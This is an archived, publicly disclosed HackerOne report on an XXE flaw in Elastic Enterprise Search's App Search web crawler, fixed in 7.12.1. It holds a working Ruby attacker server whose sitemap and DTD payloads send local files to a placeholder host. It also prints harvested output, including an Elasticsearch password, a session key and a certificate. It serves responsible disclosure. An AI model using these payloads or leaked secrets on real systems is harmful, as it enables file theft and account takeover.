---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2021-04-29
submitted: 2021-04-08T04:42:57.058Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/elastic|Elastic]]"
reporter: "dee-see"
source: "https://hackerone.com/reports/1156748"
title: "XXE in Enterprise Search's App Search web crawler"
---
# XXE in Enterprise Search's App Search web crawler

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Elastic | **Disclosed:** 2021-04-29

- Report: [https://hackerone.com/reports/1156748](https://hackerone.com/reports/1156748)
- CWE: XML External Entities (XXE)
- Submitted: 2021-04-08T04:42:57.058Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

Hello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.

## Description

Enterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.

The code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.

## Steps to reproduce

### Attacker Server

This is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)

```ruby
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
end
```

Save that to a file and run it with `ruby server.rb`.


### Enterprise Search

1. Log in to Enterprise Search
1. Click `Launch App Search`
1. Click `Create an Engine`, give it any name and click `Create Engine`
1. Click `Use the Web Crawler`
1. Enter the domain hosting the XXE payload as the `Domain URL`
1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine

Running this on an Elastic Cloud instance I got this in my log.

```text
20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] "GET /exfil?d403d12993e0 HTTP/1.1" 404 459
```

Where `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.

## Impact

At the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.

## Timeline

- **Report Filed**
- **2021-04-08** @dee-see: I guess since I report so many denial of service issues I should take the time to mention that this could be used for a billion laughs attack and cause a denial of service. :)
- **2021-04-08** @dee-see: Ok I got this further.

In the server above replace the `sitemap.xml` route with

```ruby
get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY test "http://YOURDOMAIN.COM/pingback"> 
<!ENTITY file SYSTEM "file:///">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;?&file;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end
```

and add this

```ruby
get '/pingback' do
  puts URI.unescape(request.query_string)
end
```

And we obtain this file listing.

```text
.dockerenv
app 
bin    
dev   
etc 
home
lib         
lib64     
licenses   
lost+found
media
mnt 
opt     
proc    
root
run  
sbin
srv          
sys    
tmp        
usr       
var
```

Changing the `file` entity to `file:///etc/passwd` we can obtain

```text
root:x:0:0:root:/root:/bin/bash                                                               
bin:x:1:1:bin:/bin:/sbin/nologin   
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown                                            
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin                                  
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
```
- **2021-04-08** @dee-see: `/app/insance_data.json`

```json
{"instance_capacity":2048,"instance_configuration_id":"azure.enterprisesearch.d64sv3","allocator_filter":{"bool":{"must":[{"bool":{"must":[{"bool":{"must":[{"term":{"data.attributes.metadata.instanceFamily":{"value":"azure.highcpu"}}}]}}]}}]}},"node_types":["appserver","worker","connector"],"observability":null,"resources":{"quota":{"fs_multiplier":2.0}},"plan_version":"1.0","enterprise_search":{"elasticsearch_url":"http://39697b1758d84fdfaad67f53b8a18931.containerhost:9244","enterprise_search_elasticsearch_username":"cloud-internal-enterprise_search-server","enterprise_search_elasticsearch_password":"o8Q250QCZWAl7aBuw8V0Ofbl","version":"7.12.0","external_port":443,"external_host":"enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com","secret_session_key":"QvCILaiynaQ4P6c5z8$7Lxb5Zjg96sXDs3eZAkpW5Dw="},"identity":{"service_provider":{"security_realms":{"saml":[{"name":"cloud-saml-enterprise_search-40123656d7064c9fa7cbb58faa59f64d","order":100,"description":"Log in with El$
stic Cloud","icon":"logoCloud"}],"basic":[]}}},"logical_zone_name":"zone-0","start":true,"maintenance":false,"source":{"facilitator":"constructor","action":"enterprise_search.create-instances","date":$2021-04-08T03:02:50.640Z","plan_id":"cbba05f3-d2cf-41e3-8458-af2f4edb1aa7"},"tls":{"node_name":"instance-0000000000.node.40123656d7064c9fa7cbb58faa59f64d.cluster.2534374091.account","encrypted_transpo$t":true,"encrypted_http":true},"allocator_name":"0d192425-ec2b-4232-805f-07412106ea8c","allocator_id":"0d192425-ec2b-4232-805f-07412106ea8c","allocator_zone_name":"eastus-3","overrides":{"resources":{$}} 
```

`/app/config/certs/` directory listing

```text
internal_tls_ca.crt
keystore.kcs
node.crt
node.key
trust.yml
```

The `.key` file looks like a private key.

`/app/config/beats.json`

```json
{"ece.cluster":"40123656d7064c9fa7cbb58faa59f64d","ece.instance":"instance-0000000000"}
```

Unfortunately (for me!) I can't pull `/app/config/enterprise_search.yml`. I think it might be too long for a URL?
- **2021-04-08** @dee-see: Alright got to start my work day, let me know if that's not a critical yet I'll try harder. ;) I could send HTTP requests to an external host and read the body but I had no success pulling data from the AWS metadata endpoint yet.
- **2021-04-08** @dee-see: Ah it's azure, I'm an idiot that explains why there's no AWS metadata :D But I'm pretty sure I *could* fetch the metadata if someone running it on premise on an AWS instance was to crawl my website.
- **2021-04-09** @h1_analyst_robert: Hi @dee-see,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@croissants
- **Report Needs More Info**
- **Report New**
- **2021-04-11** @dee-see: I took the time to think about what all this data meant and about a few real world scenarios and I pretty much wrote a novel. :)

Attack scenario 1: A website owner sees in their traffic logs that they're being crawled by App Search.

By using the attack above and leaking `/app/instance_data.json` they can grab the following information

- `external_host`: `enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com`
- `enterprise_search_elasticsearch_username`: `cloud-internal-enterprise_search-server`
- `enterprise_search_elasticsearch_password`: `o8Q250QCZWAl7aBuw8V0Ofbl`

Then they can navigate to https://enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com/ent/select and see or delete all the data in App Search and Workspace Search. They also have access to the credentials pages which list read/write API tokens in plain text so they steal that and keep persistence until they're revoked. It's basically "owner" access to enterprise search. The same creds can also be used to log into the elastic search instance which will be located at `https://enterprise-search-deployment-9af999.es.eastus.azure.elastic-cloud.com:9243/` (basically replace `ent` with `es` in the `external_host` above and add the port). For example here's a JSON dump <https://cloud-internal-enterprise_search-server:o8Q250QCZWAl7aBuw8V0Ofbl@enterprise-search-deployment-9af999.es.eastus.azure.elastic-cloud.com:9243/_all> of the ES structures the user has access to.

CVSS: `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` 8.7

Attack scenario 2: A user with `Dev` access to Enterprise Search (`Dev` can manage everything about a given engine but can't see the other engines they haven't been assigned to) who wants to escalate their privilege. They can point their engine to a site map they control and carry out the same attack as above and become owner.

CVSS: Somewhere between `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` 9.6 and `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N` 8.7 (PR low or high... `Dev` is in the middle of the Enterprise Search role hierarchy so I don't know which one to choose 🤷)

Additionally an attacker can get the `secret_session_key` (`QvCILaiynaQ4P6c5z8N7Lxb5Zjg96sXDs3eZAkpW5Dw`) which appears to be used for user sessions and with some reverse engineering *might* lead to forged cookies.

There's also a private key

```
-----BEGIN RSA PRIVATE KEY-----
[REDACTED KEY BODY - see source report]
-----END RSA PRIVATE KEY-----
```

and certificate

```
-----BEGIN CERTIFICATE-----
MIID/DCCAuSgAwIBAgIGAXivbrLsMA0GCSqGSIb3DQEBCwUAMCcxJTAjBgNVBAMT
HGVsYXN0aWMgY2UgaW50ZXJuYWwgdGxzIHJvb3QwHhcNMjEwNDA4MDMwMjUwWhcN
MjIwNTExMDMwMjUwWjBfMV0wWwYDVQQDE1RpbnN0YW5jZS0wMDAwMDAwMDAwLm5v
ZGUuNDAxMjM2NTZkNzA2NGM5ZmE3Y2JiNThmYWE1OWY2NGQuY2x1c3Rlci4yNTM0
Mzc0MDkxLmFjY291bnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDP
Zvr8w6ZViUuuSIWgdbz+v1Bv6Laf/b6xTcOS1AW/m3uEVNKPwhFO4W9+4loQzJGv
EcQyuQKEqnt2/pnqRB6lImL3Vv5YyyX/yR2AYr+RRSffj1++egtTG49p0lAbAEaJ
tNMxE+w3K9AZHTGMBvXoXnrfWUySwmpyU6bRVMhw5YGR+LhX696PRavAUzljGiQD
aC84yMkPv+HOMg0W+ox/37vbc5BYKQ5wlq/HbPG6Vd5Uv928dZXrZDYOo0Ijpcaf
F+jvqGAlvOQGmEwGhXskH1adIY7r5iZOmrUbK2dE/piM/YxR9l28T1PA0fkNvE7e
ZWXczs+iR7fz3MHkXgdZAgMBAAGjgfUwgfIwaAYDVR0RBGEwX6BdBgNVBAOgVgxU
aW5zdGFuY2UtMDAwMDAwMDAwMC5ub2RlLjQwMTIzNjU2ZDcwNjRjOWZhN2NiYjU4
ZmFhNTlmNjRkLmNsdXN0ZXIuMjUzNDM3NDA5MS5hY2NvdW50MEkGA1UdIwRCMECA
FPwqjM/XkxWr11Z4o+e6+xsdkoA2oSCkHjAcMRowGAYDVQQDExFlbGFzdGljIGNl
IG1hc3RlcoIGAXe5s5msMB0GA1UdDgQWBBQCvZcqZ14RE885THfQwS4XDRFBMTAM
BgNVHRMEBTADAQH/MA4GA1UdDwEB/wQEAwIB9jANBgkqhkiG9w0BAQsFAAOCAQEA
XX7DCQr1h8CkJp+d2BekowuzaiZZlNdZGDyNWyJDlZkWAmuTJUaT2eNboO/FsP57
AJU7p5t0Wi6RG1f0MjmQrF5SJOPdgfg7xutapGyTU9N+pfwxMdNr97fVhvWcrXyU
wQqY2KwJrvGeniDFXCJ9fvvK0ZCCF6HQTN1sOKrRnk/JX3COPFk21AeevkJvEgDL
i00TTPlYFeQ+3Eq8mDTRQVV1DLkNFZMeuQ0mEaQCO4P9NnYWLNY2NCdbSoO0c/Ig
p1NvBC7Gril+1P2JSX4uhcfQW2W/LG9Fp46KBQlVwDynJhyFENg8tepAGIbo23zc
SQDhKYIUGhFIpZhbvVPQrQ==
-----END CERTIFICATE-----
```

which appears to be the SSL cert for elastic search emitted by your internal TLS certicate authority (this is the data extracted from the cert by `openssl`)

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1617850970860 (0x178af6eb2ec)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = elastic ce internal tls root
        Validity
            Not Before: Apr  8 03:02:50 2021 GMT
            Not After : May 11 03:02:50 2022 GMT
        Subject: CN = instance-0000000000.node.40123656d7064c9fa7cbb58faa59f64d.cluster.2534374091.account
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:cf:66:fa:fc:c3:a6:55:89:4b:ae:48:85:a0:75:
                    bc:fe:bf:50:6f:e8:b6:9f:fd:be:b1:4d:c3:92:d4:
                    05:bf:9b:7b:84:54:d2:8f:c2:11:4e:e1:6f:7e:e2:
                    5a:10:cc:91:af:11:c4:32:b9:02:84:aa:7b:76:fe:
                    99:ea:44:1e:a5:22:62:f7:56:fe:58:cb:25:ff:c9:
                    1d:80:62:bf:91:45:27:df:8f:5f:be:7a:0b:53:1b:
                    8f:69:d2:50:1b:00:46:89:b4:d3:31:13:ec:37:2b:
                    d0:19:1d:31:8c:06:f5:e8:5e:7a:df:59:4c:92:c2:
                    6a:72:53:a6:d1:54:c8:70:e5:81:91:f8:b8:57:eb:
                    de:8f:45:ab:c0:53:39:63:1a:24:03:68:2f:38:c8:
                    c9:0f:bf:e1:ce:32:0d:16:fa:8c:7f:df:bb:db:73:
                    90:58:29:0e:70:96:af:c7:6c:f1:ba:55:de:54:bf:
                    dd:bc:75:95:eb:64:36:0e:a3:42:23:a5:c6:9f:17:
                    e8:ef:a8:60:25:bc:e4:06:98:4c:06:85:7b:24:1f:
                    56:9d:21:8e:eb:e6:26:4e:9a:b5:1b:2b:67:44:fe:
                    98:8c:fd:8c:51:f6:5d:bc:4f:53:c0:d1:f9:0d:bc:
                    4e:de:65:65:dc:ce:cf:a2:47:b7:f3:dc:c1:e4:5e:
                    07:59
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                othername:<unsupported>
            X509v3 Authority Key Identifier: 
                keyid:FC:2A:8C:CF:D7:93:15:AB:D7:56:78:A3:E7:BA:FB:1B:1D:92:80:36
                DirName:/CN=elastic ce master
                serial:01:77:B9:B3:99:AC

            X509v3 Subject Key Identifier: 
                02:BD:97:2A:67:5E:11:13:CF:39:4C:77:D0:C1:2E:17:0D:11:41:31
            X509v3 Basic Constraints: 
                CA:TRUE
            X509v3 Key Usage: critical
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Certificate Sign, CRL Sign
    Signature Algorithm: sha256WithRSAEncryption
         5d:7e:c3:09:0a:f5:87:c0:a4:26:9f:9d:d8:17:a4:a3:0b:b3:
         6a:26:59:94:d7:59:18:3c:8d:5b:22:43:95:99:16:02:6b:93:
         25:46:93:d9:e3:5b:a0:ef:c5:b0:fe:7b:00:95:3b:a7:9b:74:
         5a:2e:91:1b:57:f4:32:39:90:ac:5e:52:24:e3:dd:81:f8:3b:
         c6:eb:5a:a4:6c:93:53:d3:7e:a5:fc:31:31:d3:6b:f7:b7:d5:
         86:f5:9c:ad:7c:94:c1:0a:98:d8:ac:09:ae:f1:9e:9e:20:c5:
         5c:22:7d:7e:fb:ca:d1:90:82:17:a1:d0:4c:dd:6c:38:aa:d1:
         9e:4f:c9:5f:70:8e:3c:59:36:d4:07:9e:be:42:6f:12:00:cb:
         8b:4d:13:4c:f9:58:15:e4:3e:dc:4a:bc:98:34:d1:41:55:75:
         0c:b9:0d:15:93:1e:b9:0d:26:11:a4:02:3b:83:fd:36:76:16:
         2c:d6:36:34:27:5b:4a:83:b4:73:f2:20:a7:53:6f:04:2e:c6:
         ae:29:7e:d4:fd:89:49:7e:2e:85:c7:d0:5b:65:bf:2c:6f:45:
         a7:8e:8a:05:09:55:c0:3c:a7:26:1c:85:10:d8:3c:b5:ea:40:
         18:86:e8:db:7c:dc:49:00:e1:29:82:14:1a:11:48:a5:98:5b:
         bd:53:d0:ad
```

This means an attacker can man in the middle connections to the elastic stack without raising any certificate warnings.
- **2021-04-11** @dee-see: I put `A:N` in the CVSS above but as I mentioned [somewhere in this wall of text](#activity-11312476) there's an availability component to it so that bumps the score to a minimum of 9.0 according to my calcs!
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2021-04-12** @dee-see: Thanks a lot for the bounty and bonus! :)
- **2021-04-29** @dee-see: I think we can resolve this one now that [7.12.1](https://discuss.elastic.co/t/7-12-1-security-update/271433) is out!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Bounty Awarded**
- **2021-05-11** @dee-see: Thanks! Happy to contribute to a bug bounty program for widely used, high impact open source software with good communication & fast payouts!
